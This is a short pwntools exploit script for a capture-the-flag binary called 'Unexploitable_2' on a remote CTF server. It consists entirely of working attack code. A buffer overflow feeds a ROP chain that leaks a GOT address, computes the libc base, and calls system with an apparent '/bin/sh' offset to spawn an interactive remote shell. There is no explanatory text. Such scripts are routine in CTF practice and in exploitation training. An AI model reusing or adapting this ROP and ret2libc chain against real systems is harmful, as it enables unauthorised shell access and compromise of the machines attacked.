from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3029)
#p = process('./Unexploitable_2')
e = ELF('./Unexploitable_2')

context.log_level = "debug"

p_r = 0x0000000000400773
main = 0x00000000040068C

payload = 'a' * 0x18

payload += p64(p_r)
payload += p64(e.got['system'])
payload += p64(e.plt['system'])
payload += p64(main)

p.sendline(payload)

p.recvuntil('1: ')

libc = u64(p.recv(6).ljust(8,'\x00')) - 0x0000000000045390

payload = 'a' * 0x18

payload += p64(p_r)
payload += p64(libc + 0x18cd57)
payload += p64(e.plt['system'])

p.sendline(payload)

p.interactive()
